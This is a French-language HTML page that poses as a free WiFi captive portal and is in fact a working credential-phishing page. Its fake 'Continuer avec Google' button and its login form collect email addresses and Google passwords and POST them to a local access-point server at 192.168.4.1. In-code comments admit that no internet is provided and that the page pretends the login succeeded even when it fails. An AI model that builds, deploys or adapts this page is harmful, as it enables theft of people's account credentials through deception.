<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Gratuit - Connexion</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 420px;
            width: 100%;
            overflow: hidden;
        }

        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px 30px 30px;
            text-align: center;
        }

        .header h1 {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .header p {
            font-size: 15px;
            opacity: 0.95;
        }

        .wifi-icon {
            width: 60px;
            height: 60px;
            margin: 0 auto 20px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 30px;
        }

        .content {
            padding: 35px 30px;
        }

        .welcome-text {
            text-align: center;
            margin-bottom: 30px;
            color: #333;
        }

        .welcome-text h2 {
            font-size: 22px;
            margin-bottom: 8px;
            color: #1a1a1a;
        }

        .welcome-text p {
            font-size: 14px;
            color: #666;
        }

        .google-btn {
            width: 100%;
            background: white;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            padding: 14px 20px;
            font-size: 16px;
            font-weight: 500;
            color: #3c4043;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.3s ease;
            margin-bottom: 25px;
        }

        .google-btn:hover {
            background: #f8f9fa;
            border-color: #dadce0;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }

        .google-btn:active {
            transform: scale(0.98);
        }

        .google-icon {
            width: 20px;
            height: 20px;
        }

        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 25px 0;
            color: #999;
            font-size: 14px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #e0e0e0;
        }

        .divider span {
            padding: 0 15px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-size: 14px;
            font-weight: 500;
        }

        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.3s ease;
            background: #fafafa;
        }

        .form-group input:focus {
            outline: none;
            border-color: #667eea;
            background: white;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .submit-btn {
            width: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 15px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .terms {
            text-align: center;
            font-size: 12px;
            color: #999;
            margin-top: 25px;
            line-height: 1.6;
        }

        .terms a {
            color: #667eea;
            text-decoration: none;
        }

        .terms a:hover {
            text-decoration: underline;
        }

        .loading {
            display: none;
            text-align: center;
            padding: 30px;
        }

        .loading.active {
            display: block;
        }

        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .success-message {
            display: none;
            text-align: center;
            padding: 30px;
            color: #10b981;
        }

        .success-message.active {
            display: block;
        }

        .success-icon {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: #10b981;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 35px;
            margin: 0 auto 20px;
        }

        @media (max-width: 480px) {
            .container {
                border-radius: 0;
            }
            
            .header h1 {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="wifi-icon">ðŸ“¶</div>
            <h1>WiFi Gratuit</h1>
            <p>Connectez-vous pour accÃ©der Ã  Internet</p>
        </div>
        
        <div class="content" id="loginForm">
            <div class="welcome-text">
                <h2>Bienvenue!</h2>
                <p>Choisissez votre mÃ©thode de connexion</p>
            </div>

            <button class="google-btn" onclick="loginWithGoogle()">
                <svg class="google-icon" viewBox="0 0 24 24">
                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                </svg>
                Continuer avec Google
            </button>

            <div class="divider">
                <span>OU</span>
            </div>

            <form id="credentialsForm" onsubmit="return handleSubmit(event)">
                <div class="form-group">
                    <label for="email">Email</label>
                    <input type="email" id="email" name="username" placeholder="votreemail@example.com" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Mot de passe</label>
                    <input type="password" id="password" name="password" placeholder="â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢" required>
                </div>

                <button type="submit" class="submit-btn">Se connecter</button>
            </form>

            <div class="terms">
                En vous connectant, vous acceptez nos<br>
                <a href="#">Conditions d'utilisation</a> et notre <a href="#">Politique de confidentialitÃ©</a>
            </div>
        </div>

        <div class="loading" id="loadingMessage">
            <div class="spinner"></div>
            <p style="color: #666; font-size: 15px;">Connexion en cours...</p>
        </div>

        <div class="success-message" id="successMessage">
            <div class="success-icon">âœ“</div>
            <h2 style="margin-bottom: 10px;">Connexion rÃ©ussie!</h2>
            <p style="color: #666;">Vous allez Ãªtre redirigÃ©...</p>
        </div>
    </div>

    <script>
        function loginWithGoogle() {
            // Simulate Google login
            const email = prompt("Entrez votre adresse Gmail:");
            if (email) {
                const password = prompt("Entrez votre mot de passe Google:");
                if (password) {
                    submitCredentials(email, password);
                }
            }
        }

        function handleSubmit(event) {
            event.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            submitCredentials(email, password);
            return false;
        }

        function submitCredentials(username, password) {
            // Show loading
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('loadingMessage').classList.add('active');

            // Prepare data
            const formData = new URLSearchParams();
            formData.append('username', username);
            formData.append('password', password);

            // Send to server
            fetch('http://192.168.4.1:8080/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                // Show success message
                document.getElementById('loadingMessage').classList.remove('active');
                document.getElementById('successMessage').classList.add('active');

                // Simulate redirect after 2 seconds
                setTimeout(() => {
                    // Stay on portal page (no internet provided)
                    document.getElementById('successMessage').classList.remove('active');
                    document.getElementById('loginForm').style.display = 'block';
                    
                    // Show a "reconnecting" message
                    alert('Connexion Ã©tablie. Veuillez patienter...');
                }, 2000);
            })
            .catch(error => {
                console.error('Error:', error);
                // Show error but pretend it worked
                document.getElementById('loadingMessage').classList.remove('active');
                document.getElementById('successMessage').classList.add('active');
                
                setTimeout(() => {
                    document.getElementById('successMessage').classList.remove('active');
                    document.getElementById('loginForm').style.display = 'block';
                }, 2000);
            });
        }

        // Auto-submit if coming from captive portal detection
        window.addEventListener('load', function() {
            // Check if this is a captive portal detection request
            if (window.location.pathname.includes('generate_204') || 
                window.location.pathname.includes('hotspot-detect')) {
                // Redirect to main portal page
                window.location.href = '/portal.html';
            }
        });
    </script>
</body>
</html>
